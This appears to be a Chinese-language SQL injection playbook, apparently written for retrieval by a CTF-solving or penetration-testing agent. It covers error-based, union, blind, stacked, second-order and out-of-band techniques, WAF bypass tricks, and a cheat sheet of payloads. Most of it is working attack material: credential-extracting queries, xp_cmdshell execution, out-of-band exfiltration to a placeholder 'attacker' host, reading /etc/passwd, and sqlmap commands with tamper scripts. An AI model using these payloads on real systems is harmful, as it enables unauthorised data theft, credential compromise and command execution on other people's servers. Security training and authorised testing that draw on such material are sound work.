# SQL 注入（SQLi）深度解题手册

适用题型（命中即召回本手册）：SQL注入 SQLi 注入 盲注 联合查询 union select 报错注入 布尔盲注 时间盲注 堆叠 二次注入 万能密码 登录绕过 sqlmap tamper waf 绕过 information_schema 数据库 脱库 sleep

## 1. 识别与分类（按响应信号判类型，选最小打法）
- 报错型：注入 `'` 出 SQL 语法报错（"SQL syntax"/"ORA-"/"PG::"/"Microsoft OLE DB"）→ 用报错函数直接回显数据；
- 联合型：页面有数据回显，`ORDER BY n` 可列数、`UNION SELECT` 能拼其他表数据进页面；
- 布尔盲：`AND 1=1` 与 `AND 1=2` 响应长度/内容/状态码不同 → 逐字符二分猜数据；
- 时间盲：`SLEEP(5)`/`WAITFOR DELAY`/`pg_sleep(5)` 响应延迟明显 → 无回显时按字符猜；
- 堆叠/二次/OOB：`;` 后能执行第二句 → 直接写数据/开 shell；入库无异常但另一功能读回时触发 → 存储点+触发点两段；数据库可对外发 DNS/HTTP → 外带。

## 2. 攻击方法论（按类型选最小打法）
1. 找注入点：GET/POST 参数、JSON 字段、Cookie/UA/XFF 头全部试 `'` `"` `\`，对比 `1=1`/`1=2` 响应差异；报错=直接注入，无报错=盲注入。
2. 判 DBMS：报错文本 + 函数探测 `@@version`(MSSQL/MySQL) `version()`(PG) `banner from v$version`(Oracle)；字符串拼接差异 `'a'||'b'`(PG/Oracle) `'a'+'b'`(MSSQL) `CONCAT`(MySQL)。
3. 联合型：`' ORDER BY n--` 递增到报错得列数 → `UNION SELECT null,null,...` 定位回显列 → `UNION SELECT username,0x3a,password FROM users--` 提取。
4. 报错型：`extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))` / `updatexml`(MySQL)、`CAST`/`convert`(MSSQL)，把库/表/列一层层带进报错。
5. 布尔盲：`AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>96--` 二分逐字符；python 遍历 ASCII 32~127，每字符 5~7 次请求。
6. 时间盲：`AND IF(ASCII(SUBSTR((SELECT password LIMIT 1),1,1))>96,SLEEP(1),0)--`；`;IF(...) WAITFOR DELAY '0:0:1'--`(MSSQL)；`;SELECT CASE WHEN ... THEN pg_sleep(1) END--`(PG)。
7. 堆叠：`'; INSERT INTO users VALUES(...)--`、`'; UPDATE users SET password='x' WHERE username='admin'--`；MSSQL `;EXEC xp_cmdshell 'whoami'--`。
8. OOB 外带：MySQL `SELECT LOAD_FILE('\\\\attacker\\share')` 触发 DNS；MSSQL `;EXEC master..xp_dirtree '\\attacker\x'--`；Oracle `UTL_HTTP.REQUEST('http://attacker/'||(SELECT user))`；攻击机 tcpdump/HTTP 监听收数据。
9. 二次注入：注册/资料处存 payload（`admin'--`、`test' OR '1'='1'--`），在改密/管理列表/导出/报表处触发，观察第二处响应差异。
10. sqlmap 提速：`sqlmap -u "<url>" --batch --random-agent --technique=BEUSTQ --level=3 --risk=2`；盲注加 `--dbms=mysql --delay=1` 防限速。

## 3. 变体与绕过
- 关键词拆解：`SEL/**/ECT`、`UN/**/ION`、`/*!50000OR*/`(MySQL 版本注释)、`UnIoN SeLeCt` 大小写。
- 空格替代：`%09`(tab) `%0a`(换行) `/**/`、括号 `SELECT(username)FROM(users)`；逗号用 JOIN 或 `SUBSTR(x FROM 1 FOR 1)`、`LIMIT 1 OFFSET 0`。
- 引号/等号替代：`0x61646d696e`(hex)、`CHAR(97,100,...)`、`CHR(97)||CHR(100)`；`=` 换 `LIKE`/`REGEXP`/`IN(1)`/`BETWEEN 1 AND 1`；`OR/AND` 换 `||`/`&&`/`XOR`。
- 编码绕过：`%55NION`(URL)、`\u004f\u0052`(JSON unicode，配 sqlmap `charunicodeescape`)、双 URL 编码。
- 函数替代：`OR 1 BETWEEN 0 AND 2`、`OR '1' LIKE '1'`、`OR GREATEST(1,0)=1`、JSON 函数 `OR JSON_EXTRACT('{"a":1}','$.a')=1`（WAF 常不解析内嵌 JSON 语法）。
- information_schema 被封：MySQL 换 `sys.schema_table_statistics`/`mysql.innodb_table_stats`；无回显一律转时间盲/OOB。
- 高强 WAF 放弃判定：`'` 无报错且真假条件响应一致 → 参数化，非注入；关键词/unicode/分块/脏数据前缀全被 TCP 断连 → 转越权/逻辑漏洞。

## 战法要点
- 有回显优先 union/报错；无回显先时间盲验证（`SLEEP(3)` 延迟≥3s 即确认）再决定逐字符还是外带。
- 三步最小验证：单引号→真假条件→时间延迟，确认注入点后再铺开，避免无信息重复请求。
- 报错文本是免费情报：先读报错判 DBMS 再选函数，少走弯路。
- 登录/搜索/排序/筛选/报表参数优先试，这些最常拼 SQL。
- WAF 拦截按成功率试：JSON 操作符 > 换行/注释分割 > unicode 编码 > 大小写 > 函数替代；一次脚本批量发 10~20 变体。
- 盲注优先交 sqlmap（`--technique=B/T` + `--tamper`），手工只判别不逐字符硬猜。
- 注入先查 `--current-user --is-dba`：DBA 才有文件读写/`--os-shell` 后手；`--file-read=/etc/passwd` 顺手验证。
- 二次注入靠"存储点+触发点"配对：改密、管理列表、导出、报表是高频触发点。

## 速查清单
```text
'   "   \   '--   '#
' OR 1=1--      ' OR '1'='1'--     ') OR ('1'='1
admin'--        admin'#            '='
1 OR 1=1        1 AND 1=1 / 1 AND 1=2        （布尔判别）
' ORDER BY n--                  ' UNION SELECT null,null,null--
' UNION SELECT username,0x3a,password FROM users--
' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>96--
' AND IF(ASCII(SUBSTR(database(),1,1))>96,SLEEP(1),0)--
'; WAITFOR DELAY '0:0:3'--        ';SELECT pg_sleep(3)--      （MSSQL/PG）
'; IF(...) WAITFOR DELAY '0:0:1'--                （MSSQL 条件延迟）
' OR JSON_EXTRACT('{"a":1}','$.a')=1-- -          （WAF 绕过）
' OR 1 BETWEEN 0 AND 2-- -     ' OR '1' LIKE '1'-- -     ' OR GREATEST(1,0)=1-- -
UN/**/ION SEL/**/ECT    /*!50000OR*/    %55NION %53ELECT    \u004f\u0052
'%0aOR%0a'1'='1                                   （换行分割）
' AND (SELECT 1 FROM (SELECT SLEEP(3))a WHERE database() LIKE 'a%')-- -
sqlmap -u "<url>" --batch --random-agent --technique=BEUSTQ --level=3 --risk=2
sqlmap -r req.txt --data='{"k":"*"}' --tamper=space2comment,between,randomcase
sqlmap -u "<store>" --data="u=*" --second-url="<trigger>" --batch --dbs
```
